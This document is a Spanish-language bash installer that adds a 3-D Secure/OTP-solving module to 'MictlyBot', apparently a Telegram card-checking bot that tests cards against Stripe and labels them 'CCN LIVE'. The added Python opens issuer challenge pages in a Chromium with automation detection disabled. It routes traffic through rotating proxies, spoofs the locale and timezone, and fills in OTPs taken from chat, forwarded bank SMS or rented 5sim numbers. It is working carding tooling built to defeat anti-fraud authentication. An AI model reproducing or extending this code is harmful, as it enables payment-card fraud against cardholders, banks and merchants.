#!/usr/bin/env bash
# Instala el flujo OTP en MictlyBot. Idempotente: se puede reejecutar.
set -euo pipefail

cd "$(dirname "$0")"

if [[ ! -f mictlybot/cardcheck.py || ! -f mictlybot/targets.py ]]; then
  echo "ERROR: no parece la raíz de MictlyBot. Abortando." >&2
  exit 1
fi

# --- entorno aislado ---
if [[ ! -x .venv/bin/python ]]; then
  if ! python3 -m venv .venv 2>/dev/null; then
    echo "ERROR: no pude crear el venv. Instala python3-venv:" >&2
    echo "  sudo apt install python3-venv" >&2
    exit 1
  fi
fi
PY=".venv/bin/python"
"$PY" -m pip install --quiet --upgrade pip

STAMP="$(date +%Y%m%d-%H%M%S)"
BACKUP=".otp-backup-$STAMP"
mkdir -p "$BACKUP"
for f in mictlybot/config.py mictlybot/handlers.py mictlybot/app.py mictlybot/cardcheck.py \
         mictlybot/commands.py pyproject.toml .env.example .gitignore requirements.txt; do
  [[ -f "$f" ]] && cp --parents "$f" "$BACKUP"/
done
echo "Respaldo en $BACKUP/ (borralo cuando confirmes que todo va)"

mkdir -p mictlybot/otp tests profiles
touch mictlybot/otp/__init__.py

cat << 'PY' > mictlybot/otp/models.py
"""Modelos del flujo OTP. Dominio puro, sin Playwright."""

from __future__ import annotations

import asyncio
from dataclasses import dataclass
from typing import Protocol


@dataclass(slots=True)
class Challenge:
    kind: str  # "redirect" | "sdk"
    acs_url: str
    source: str = ""
    livemode: bool = True
    return_url: str = ""


@dataclass(slots=True)
class OtpOutcome:
    kind: str  # authenticated | frictionless | failed | timeout | no_form | error
    detail: str = ""
    final_url: str = ""

    @property
    def ok(self) -> bool:
        return self.kind in {"authenticated", "frictionless"}


class OtpSource(Protocol):
    async def wait(self, timeout: float) -> str | None: ...


class ManualOtpSource:
    """El código lo escribe el usuario en el chat."""

    def __init__(self, future: asyncio.Future[str]) -> None:
        self._future = future

    async def wait(self, timeout: float) -> str | None:
        try:
            return await asyncio.wait_for(asyncio.shield(self._future), timeout)
        except asyncio.TimeoutError:
            return None
PY

cat << 'PY' > mictlybot/otp/detect.py
"""Extrae el challenge del payload de Stripe. Ningún 402 es un challenge."""

from __future__ import annotations

import json

from .models import Challenge

HOOKS = "https://hooks.stripe.com"


def find_challenge(status: int, raw: str) -> Challenge | None:
    if status not in (200, 402):
        return None
    try:
        payload = json.loads(raw)
    except ValueError:
        return None
    if not isinstance(payload, dict):
        return None

    action = payload.get("next_action")
    if not isinstance(action, dict):
        return None

    redirect = action.get("redirect_to_url") or {}
    url = redirect.get("url")
    if url:
        return Challenge(
            kind="redirect",
            acs_url=url,
            return_url=redirect.get("return_url") or "",
        )

    sdk = action.get("use_stripe_sdk") or {}
    source = sdk.get("three_d_secure_2_source")
    if source:
        return Challenge(
            kind="sdk",
            acs_url=f"{HOOKS}/3d_secure_2/hosted?source={source}&livemode=true",
            source=source,
        )

    legacy = sdk.get("source")  # 3DS1 heredado
    if legacy:
        return Challenge(kind="redirect", acs_url=f"{HOOKS}/3d_secure_redirect/{legacy}")

    return None
PY

cat << 'PY' > mictlybot/otp/parsers.py
"""Heurísticas para encontrar el formulario del ACS. Cada emisor pinta el suyo."""

from __future__ import annotations

import asyncio
import time

OTP_SELECTORS = (
    "input[autocomplete='one-time-code']",
    "input[type='tel']",
    "input[inputmode='numeric']",
    "input[name*='otp' i]",
    "input[id*='otp' i]",
    "input[name*='code' i]",
    "input[maxlength='6']",
    "input[maxlength='4']",
    "input[type='number']",
    "input[type='text']",
)

SUBMIT_SELECTORS = (
    "button[type='submit']",
    "input[type='submit']",
    "button[id*='submit' i]",
    "button:has-text('Continuar')",
    "button:has-text('Enviar')",
    "button:has-text('Confirmar')",
    "button:has-text('Submit')",
    "button:has-text('Verify')",
    "button:has-text('Confirm')",
)


async def find_otp_input(page, timeout: float):
    """(frame, locator) del primer input visible, o (None, None)."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        for frame in page.frames:
            for selector in OTP_SELECTORS:
                try:
                    locator = frame.locator(selector).first
                    if await locator.count() and await locator.is_visible():
                        return frame, locator
                except Exception:
                    continue
        await asyncio.sleep(0.4)
    return None, None


async def submit(frame, locator) -> None:
    for selector in SUBMIT_SELECTORS:
        try:
            button = frame.locator(selector).first
            if await button.count() and await button.is_enabled():
                await button.click()
                return
        except Exception:
            continue
    await locator.press("Enter")
PY

cat << 'PY' > mictlybot/otp/sources.py
"""Fuentes automáticas de OTP."""

from __future__ import annotations

import asyncio
import time
from contextlib import suppress

import httpx

FIVESIM = "https://5sim.net/v1"


class WebhookOtpSource:
    """Cola alimentada por una app Android que reenvía los SMS del banco."""

    def __init__(self, queue: asyncio.Queue[str]) -> None:
        self._queue = queue

    async def wait(self, timeout: float) -> str | None:
        try:
            return await asyncio.wait_for(self._queue.get(), timeout)
        except asyncio.TimeoutError:
            return None


class FiveSimOtpSource:
    """Solo útil si el número de la tarjeta es uno que controlas."""

    def __init__(self, token: str, country: str = "mexico", product: str = "any") -> None:
        self._token = token
        self._country = country
        self._product = product
        self._order_id: int | None = None

    @property
    def _headers(self) -> dict[str, str]:
        return {"Authorization": f"Bearer {self._token}", "Accept": "application/json"}

    async def wait(self, timeout: float) -> str | None:
        deadline = time.monotonic() + timeout
        async with httpx.AsyncClient(timeout=15.0) as client:
            path = f"/user/buy/activation/{self._country}/any/{self._product}"
            try:
                response = await client.get(f"{FIVESIM}{path}", headers=self._headers)
                response.raise_for_status()
                self._order_id = int(response.json()["id"])
            except (httpx.HTTPError, ValueError, KeyError):
                return None
            while time.monotonic() < deadline:
                with suppress(httpx.HTTPError, ValueError):
                    response = await client.get(
                        f"{FIVESIM}/user/check/{self._order_id}", headers=self._headers
                    )
                    sms = response.json().get("sms") or []
                    if sms:
                        return str(sms[-1]["code"])
                await asyncio.sleep(3.0)
            return None

    async def release(self, *, cancel: bool) -> None:
        if self._order_id is None:
            return
        verb = "cancel" if cancel else "finish"
        async with httpx.AsyncClient(timeout=10.0) as client:
            with suppress(httpx.HTTPError):
                await client.get(
                    f"{FIVESIM}/user/{verb}/{self._order_id}", headers=self._headers
                )
PY

cat << 'PY' > mictlybot/otp/solver.py
"""Resuelve el challenge en un Chromium real con perfil persistente."""

from __future__ import annotations

import asyncio
import hashlib
import time
from contextlib import suppress
from pathlib import Path

from .models import Challenge, OtpOutcome, OtpSource
from .parsers import find_otp_input, submit

CHALLENGE_HOSTS = ("hooks.stripe.com", "3d_secure")
DONE_TEXT = (
    "authentication complete",
    "authentication completed",
    "autenticación correcta",
    "authentication successful",
    "verified successfully",
    "completado",
    "success",
    "gracias",
)
FAIL_TEXT = ("código incorrecto", "incorrect", "inválido", "expirado", "expired")


def profile_for(root: Path, card_number: str) -> Path:
    digest = hashlib.sha1(card_number.encode()).hexdigest()[:16]
    return root / digest


async def _wait_verdict(page, deadline: float) -> OtpOutcome:
    while time.monotonic() < deadline:
        url = page.url
        if not any(marker in url for marker in CHALLENGE_HOSTS):
            return OtpOutcome("authenticated", "redirigido fuera del ACS", url)
        try:
            body = (await page.inner_text("body")).lower()
        except Exception:
            body = ""
        if any(marker in body for marker in FAIL_TEXT):
            return OtpOutcome("failed", "el ACS rechazó el código", url)
        if any(marker in body for marker in DONE_TEXT):
            return OtpOutcome("authenticated", "el ACS confirmó", url)
        await asyncio.sleep(0.5)
    return OtpOutcome("timeout", "sin veredicto del ACS", page.url)


async def solve(
    challenge: Challenge,
    *,
    source: OtpSource,
    profile_dir: Path,
    proxy_url: str | None,
    headless: bool = True,
    user_agent: str,
    platform: str = "Linux",
    locale: str = "es-MX",
    timezone_id: str = "America/Mexico_City",
    form_timeout: float = 25.0,
    otp_timeout: float = 120.0,
    verdict_timeout: float = 60.0,
    attempts: int = 2,
) -> OtpOutcome:
    from playwright.async_api import async_playwright

    profile_dir.mkdir(parents=True, exist_ok=True)

    async with async_playwright() as pw:
        context = await pw.chromium.launch_persistent_context(
            user_data_dir=str(profile_dir),
            headless=headless,
            user_agent=user_agent,
            locale=locale,
            timezone_id=timezone_id,
            viewport={"width": 1366, "height": 768},
            proxy={"server": proxy_url} if proxy_url else None,
            args=[
                "--disable-blink-features=AutomationControlled",
                "--no-first-run",
                "--no-default-browser-check",
            ],
        )
        try:
            page = context.pages[0] if context.pages else await context.new_page()
            await page.goto(
                challenge.acs_url, wait_until="domcontentloaded", timeout=45_000
            )

            for attempt in range(attempts):
                frame, locator = await find_otp_input(page, form_timeout)
                if frame is None:
                    if attempt == 0:
                        return await _wait_verdict(
                            page, time.monotonic() + min(verdict_timeout, 20)
                        )
                    return OtpOutcome("no_form", "no encontré input de OTP", page.url)

                code = await source.wait(otp_timeout)
                if code is None:
                    return OtpOutcome("timeout", "sin OTP en el plazo", page.url)

                await locator.fill(code)
                await submit(frame, locator)
                verdict = await _wait_verdict(page, time.monotonic() + verdict_timeout)
                if verdict.ok or verdict.kind == "timeout":
                    return verdict
            return OtpOutcome("failed", "se agotaron los intentos", page.url)
        finally:
            with suppress(Exception):
                await context.close()
PY

cat << 'PY' > mictlybot/otp/runner.py
"""Une check + challenge + solver. Lo que llama el handler."""

from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path

from ..cardcheck import CardData, CheckResult, check_card
from ..targets import Target
from .detect import find_challenge
from .models import OtpOutcome, OtpSource
from .solver import profile_for, solve


@dataclass(slots=True)
class OtpRun:
    check: CheckResult
    outcome: OtpOutcome | None = None


async def check_then_solve(
    card: CardData,
    *,
    target: Target,
    source_factory,
    proxy_pool,
    bin_lookup=None,
    timeout: float = 30.0,
    otp_timeout: float = 120.0,
    profile_root: Path,
    user_agent: str,
    headless: bool = True,
    platform: str = "Linux",
) -> OtpRun:
    check = await check_card(
        card,
        target=target,
        bin_lookup=bin_lookup,
        proxy=proxy_pool,
        timeout=timeout,
    )
    challenge = find_challenge(200, check.raw) if check.raw else None
    if challenge is None:
        return OtpRun(check)

    source: OtpSource = source_factory()
    outcome = await solve(
        challenge,
        source=source,
        profile_dir=profile_for(profile_root, card.number),
        proxy_url=proxy_pool.random() if proxy_pool else None,
        headless=headless,
        user_agent=user_agent,
        platform=platform,
        otp_timeout=otp_timeout,
    )
    return OtpRun(check, outcome)
PY

cat << 'PY' > tests/test_otp_detect.py
import json

from mictlybot.otp.detect import find_challenge


def test_sin_next_action_devuelve_none():
    assert find_challenge(200, json.dumps({"object": "payment_method"})) is None


def test_redirect():
    raw = json.dumps({"next_action": {"redirect_to_url": {"url": "https://acs/x"}}})
    challenge = find_challenge(402, raw)
    assert challenge.kind == "redirect"
    assert challenge.acs_url == "https://acs/x"


def test_sdk_2():
    raw = json.dumps(
        {"next_action": {"use_stripe_sdk": {"three_d_secure_2_source": "tdsrc_1"}}}
    )
    challenge = find_challenge(402, raw)
    assert "3d_secure_2/hosted" in challenge.acs_url


def test_402_sin_action_no_es_challenge():
    assert find_challenge(402, '{"error": {"code": "authentication_required"}}') is None
PY

cat << 'PY' > .otp_patch.py
import pathlib
import re
import sys

FAILED = []


def patch(path: str, old: str, new: str) -> None:
    file = pathlib.Path(path)
    text = file.read_text(encoding="utf-8")
    if new in text:
        print(f"  = {path} (ya parcheado)")
        return
    if old not in text:
        FAILED.append(f"{path}: no encontré el ancla -> {old[:60]!r}")
        return
    file.write_text(text.replace(old, new, 1), encoding="utf-8")
    print(f"  + {path}")


# --- config.py ---
patch(
    "mictlybot/config.py",
    "    cardcheck_bin_cache: bool = True\n",
    "    cardcheck_bin_cache: bool = True\n"
    '    otp_mode: str = "manual"\n'
    "    otp_timeout_seconds: float = 120.0\n"
    '    otp_profile_dir: str = "profiles"\n'
    "    otp_headless: bool = True\n"
    '    otp_user_agent: str = ""\n'
    '    otp_platform: str = "Linux"\n'
    '    fivesim_token: str = ""\n',
)
patch(
    "mictlybot/config.py",
    '        cardcheck_bin_cache=_env_bool("CARDCHECK_BIN_CACHE", True),\n',
    '        cardcheck_bin_cache=_env_bool("CARDCHECK_BIN_CACHE", True),\n'
    '        otp_mode=os.getenv("OTP_MODE", "manual").strip().lower(),\n'
    '        otp_timeout_seconds=_env_float("OTP_TIMEOUT_SECONDS", 120.0),\n'
    '        otp_profile_dir=os.getenv("OTP_PROFILE_DIR", "profiles").strip(),\n'
    '        otp_headless=_env_bool("OTP_HEADLESS", True),\n'
    '        otp_user_agent=os.getenv("OTP_USER_AGENT", "").strip(),\n'
    '        otp_platform=os.getenv("OTP_PLATFORM", "Linux").strip(),\n'
    '        fivesim_token=os.getenv("FIVESIM_TOKEN", "").strip(),\n',
)

# --- cardcheck.py: needle antes del catch-all ---
patch(
    "mictlybot/cardcheck.py",
    "    ('\"object\": \"payment_method\"', \"info\", \"CCN LIVE\"),\n",
    "    ('\"next_action\"', \"info\", \"3DS CHALLENGE\"),\n"
    "    ('\"object\": \"payment_method\"', \"info\", \"CCN LIVE\"),\n",
)

# --- handlers.py: imports condicionales ---
handlers = pathlib.Path("mictlybot/handlers.py")
htext = handlers.read_text(encoding="utf-8")

if "import asyncio" in htext:
    print("  = mictlybot/handlers.py (asyncio ya importado)")
else:
    patch("mictlybot/handlers.py", "import logging\n", "import asyncio\nimport logging\n")
if "from contextlib import suppress" in htext:
    print("  = mictlybot/handlers.py (suppress ya importado)")
else:
    patch(
        "mictlybot/handlers.py",
        "import logging\n",
        "import logging\nfrom contextlib import suppress\n",
    )
if "from pathlib import Path" in htext:
    print("  = mictlybot/handlers.py (Path ya importado)")
else:
    patch(
        "mictlybot/handlers.py",
        "from contextlib import suppress\n",
        "from contextlib import suppress\nfrom pathlib import Path\n",
    )

if "make_bin_lookup" in htext:
    print("  = mictlybot/handlers.py (make_bin_lookup ya importado)")
else:
    found = re.search(r"^from \.cardcheck import ([^\n(]+)$", htext, re.MULTILINE)
    if found:
        patch(
            "mictlybot/handlers.py",
            found.group(0),
            f"from .cardcheck import {found.group(1).strip()}, make_bin_lookup",
        )
    else:
        FAILED.append("mictlybot/handlers.py: falta 'from .cardcheck import ...'")

patch(
    "mictlybot/handlers.py",
    "from .luhn import check_card\n",
    "from .luhn import check_card\n"
    "from .otp.models import ManualOtpSource, OtpSource\n"
    "from .otp.runner import check_then_solve\n"
    "from .otp.sources import FiveSimOtpSource\n",
)

# --- handlers.py: ayuda ---
patch(
    "mictlybot/handlers.py",
    '    "`/target` — lista los perfiles configurados\\n"\n',
    '    "`/otp <cc|mm|aa|cvv> [target]` — abre el 3DS y pide el OTP\\n"\n'
    '    "`/target` — lista los perfiles configurados\\n"\n',
)
patch(
    "mictlybot/handlers.py",
    '"_Atajos sin slash: `.bin`, `.luhn`, `.check`_',
    '"_Atajos sin slash: `.bin`, `.luhn`, `.check`, `.otp`_',
)

# --- commands.py: menú de Telegram ---
patch(
    "mictlybot/commands.py",
    '    ("check", "Prueba una tarjeta contra Stripe"),\n',
    '    ("check", "Prueba una tarjeta contra Stripe"),\n'
    '    ("otp", "Abre el challenge 3DS y pide el OTP"),\n',
)

# --- app.py ---
patch(
    "mictlybot/app.py",
    "    luhn_checker,\n    start,\n",
    "    luhn_checker,\n    otp_code_catcher,\n    otp_cmd,\n    start,\n",
)
patch(
    "mictlybot/app.py",
    '    app.bot_data["footer"] = config.footer\n',
    '    app.bot_data["footer"] = config.footer\n'
    '    app.bot_data["otp_mode"] = config.otp_mode\n'
    '    app.bot_data["otp_timeout"] = config.otp_timeout_seconds\n'
    '    app.bot_data["otp_profile_dir"] = config.otp_profile_dir\n'
    '    app.bot_data["otp_user_agent"] = config.otp_user_agent or config.user_agent\n'
    '    app.bot_data["otp_headless"] = config.otp_headless\n'
    '    app.bot_data["otp_platform"] = config.otp_platform\n'
    '    app.bot_data["fivesim_token"] = config.fivesim_token\n'
    '    app.bot_data["otp_waiters"] = {}\n',
)
patch(
    "mictlybot/app.py",
    '    app.add_handler(CommandHandler("target", target_cmd))\n',
    '    app.add_handler(CommandHandler("target", target_cmd))\n'
    '    app.add_handler(CommandHandler("otp", otp_cmd))\n',
)
patch(
    "mictlybot/app.py",
    '    app.add_handler(MessageHandler(filters.Regex(r"^\\.check\\s+"), check_cmd))\n',
    '    app.add_handler(MessageHandler(filters.Regex(r"^\\.check\\s+"), check_cmd))\n'
    '    app.add_handler(MessageHandler(filters.Regex(r"^\\.otp\\s+"), otp_cmd))\n'
    '    app.add_handler(MessageHandler(filters.Regex(r"^\\d{4,8}$"), otp_code_catcher))\n',
)

# --- pyproject.toml ---
patch(
    "pyproject.toml",
    '    "python-dotenv>=1.0",\n',
    '    "python-dotenv>=1.0",\n    "playwright>=1.45",\n',
)
patch(
    "pyproject.toml",
    '"mictlybot/useragents.py" = ["E501"]\n',
    '"mictlybot/useragents.py" = ["E501"]\n"mictlybot/otp/*.py" = ["E501"]\n',
)

# --- .env.example / .gitignore / requirements ---
env = pathlib.Path(".env.example")
block = (
    "\n# --- OTP / 3DS challenge ---\n"
    "OTP_MODE=manual            # off | manual | fivesim\n"
    "OTP_TIMEOUT_SECONDS=120\n"
    "OTP_PROFILE_DIR=profiles\n"
    "OTP_HEADLESS=true\n"
    "OTP_PLATFORM=Linux\n"
    "OTP_USER_AGENT=\n"
    "FIVESIM_TOKEN=\n"
)
if "OTP_MODE" not in env.read_text(encoding="utf-8"):
    with env.open("a", encoding="utf-8") as handle:
        handle.write(block)
    print("  + .env.example")

gitignore = pathlib.Path(".gitignore")
ignored = gitignore.read_text(encoding="utf-8")
for entry in (".venv/", "profiles/", "contexto_proyecto.md"):
    if entry not in ignored:
        with gitignore.open("a", encoding="utf-8") as handle:
            handle.write(f"{entry}\n")
        print(f"  + .gitignore ({entry})")

req = pathlib.Path("requirements.txt")
if "playwright" not in req.read_text(encoding="utf-8"):
    with req.open("a", encoding="utf-8") as handle:
        handle.write("playwright>=1.45\n")
    print("  + requirements.txt")

if FAILED:
    print("\nANCLAS NO ENCONTRADAS:")
    for line in FAILED:
        print("  !", line)
    sys.exit(1)
PY

cat << 'PY' >> mictlybot/handlers.py


async def otp_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Abre el challenge 3DS y pide el OTP por el chat."""
    limiter: RateLimiter = context.bot_data["check_limiter"]
    registry: TargetRegistry = context.bot_data["targets"]
    pool = context.bot_data["proxy_pool"]
    footer: str = context.bot_data["footer"]

    allowed, retry_after = limiter.allow(update.effective_user.id)
    if not allowed:
        await update.message.reply_text(
            f"⏳ Vas muy rápido. Espera {retry_after:.0f} s e inténtalo de nuevo."
        )
        return

    mode = str(context.bot_data.get("otp_mode", "manual")).lower()
    if mode == "off":
        await update.message.reply_text(
            "🔌 El flujo OTP está desactivado (`OTP_MODE=off`).",
            parse_mode="Markdown",
        )
        return

    parts = (update.message.text or "").split()
    if len(parts) < 2:
        await update.message.reply_text(
            "**Uso:** `/otp 4571736012345678|12|2028|123 [target]`\n"
            "_Abre el challenge 3DS y te pide el OTP en el chat._",
            parse_mode="Markdown",
        )
        return

    try:
        card = CardData.parse(parts[1])
    except ValueError as exc:
        await update.message.reply_text(f"❌ {exc}")
        return

    try:
        target = registry.get(parts[2] if len(parts) > 2 else None)
    except TargetError as exc:
        await update.message.reply_text(f"❌ {exc}")
        return

    if not target.has_key:
        await update.message.reply_text(
            f"🔑 El target `{target.name}` no tiene claves configuradas.",
            parse_mode="Markdown",
        )
        return

    waiting = await update.message.reply_text(
        f"📡 Probando `{card.masked}` en `{target.name}`...", parse_mode="Markdown"
    )

    future: asyncio.Future[str] = asyncio.get_running_loop().create_future()
    waiters: dict = context.bot_data.setdefault("otp_waiters", {})
    waiters[update.effective_user.id] = future

    fivesim: FiveSimOtpSource | None = None
    source: OtpSource
    if mode == "fivesim" and context.bot_data.get("fivesim_token"):
        fivesim = FiveSimOtpSource(context.bot_data["fivesim_token"])
        source = fivesim
    else:
        source = ManualOtpSource(future)

    bin_client = context.bot_data.get("bin_client")
    try:
        run = await check_then_solve(
            card,
            target=target,
            source_factory=lambda: source,
            proxy_pool=pool,
            bin_lookup=make_bin_lookup(bin_client) if bin_client else None,
            timeout=context.bot_data.get("http_timeout", 30.0),
            otp_timeout=context.bot_data.get("otp_timeout", 120.0),
            profile_root=Path(context.bot_data["otp_profile_dir"]),
            user_agent=context.bot_data["otp_user_agent"],
            headless=context.bot_data["otp_headless"],
            platform=context.bot_data["otp_platform"],
        )
    except Exception:
        log.exception("Fallo inesperado en /otp de %s", card.masked)
        await waiting.edit_text("⚠️ Error interno. Inténtalo más tarde.")
        if fivesim:
            with suppress(Exception):
                await fivesim.release(cancel=True)
        return
    finally:
        waiters.pop(update.effective_user.id, None)

    if fivesim:
        with suppress(Exception):
            await fivesim.release(cancel=not (run.outcome and run.outcome.ok))

    if run.outcome is None:
        await waiting.edit_text(
            format_check(card, run.check, footer), parse_mode="Markdown"
        )
        return

    icon = "✅" if run.outcome.ok else "❌"
    await waiting.edit_text(
        f"{icon} **OTP:** `{run.outcome.kind}`\n"
        f"💳 `{card.masked}`\n"
        f"🎯 `{target.name}`\n"
        f"_{run.outcome.detail}_\n"
        f"`{run.outcome.final_url[:120]}`" + footer,
        parse_mode="Markdown",
    )


async def otp_code_catcher(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Entrega el código al solver que está esperando."""
    waiters: dict = context.bot_data.get("otp_waiters") or {}
    future = waiters.get(update.effective_user.id)
    if future is None or future.done():
        return
    future.set_result((update.message.text or "").strip())
PY

echo "Parcheando archivos..."
"$PY" .otp_patch.py
rm -f .otp_patch.py

echo "Instalando dependencias en .venv..."
"$PY" -m pip install --quiet -r requirements.txt pytest pytest-asyncio ruff
"$PY" -m pip install --quiet playwright
"$PY" -m playwright install chromium || {
  echo "AVISO: 'playwright install chromium' falló." >&2
  echo "  Prueba: .venv/bin/python -m playwright install --with-deps chromium" >&2
}

echo "Formato y lint..."
"$PY" -m ruff format mictlybot/otp tests/test_otp_detect.py
"$PY" -m ruff check mictlybot tests || echo "AVISO: ruff marcó cosas, revísalas arriba"

echo "Tests..."
"$PY" -m pytest tests/ -q

echo
echo "Listo. Siguiente paso:"
echo "  1) rellena OTP_MODE en .env"
echo "  2) source .venv/bin/activate && python -m mictlybot"
echo "  3) en Telegram: /otp 4571736012345678|12|2028|123"
